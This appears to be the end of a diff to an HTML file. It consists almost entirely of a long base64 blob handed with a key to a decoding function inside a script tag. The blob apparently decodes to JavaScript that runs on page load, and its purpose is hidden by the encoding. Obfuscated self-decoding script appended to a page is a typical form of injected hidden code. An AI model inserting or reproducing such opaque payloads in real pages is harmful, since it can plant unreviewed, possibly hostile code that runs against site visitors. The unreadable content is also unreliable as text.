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','IOSbpAy3g0');</script>
+</body>
+</html>
